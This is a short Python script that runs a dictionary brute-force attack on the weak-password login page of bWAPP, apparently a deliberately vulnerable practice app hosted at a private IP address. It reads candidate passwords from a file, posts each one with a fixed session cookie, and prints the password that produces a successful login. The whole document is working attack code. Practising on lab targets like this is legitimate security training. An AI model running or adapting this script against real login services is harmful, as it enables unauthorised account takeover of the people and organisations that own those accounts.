import requests

url = "http://192.168.0.75/bWAPP/ba_weak_pwd.php"
cookie = {"security_level":"2", "PHPSESSID":"1d62a966612f4ab092a1d96ae7e6e552"}

f = open("./dict.txt", 'r')
while True:
    passwd = f.readline().strip()
    if not passwd: break
    data = {"login":"test", "password": passwd, "form":"submit"}
    res = requests.post(url=url, data=data, cookies=cookie)

    if(res.text.find("Successful login!")>-1):
        print(passwd)
        break
f.close()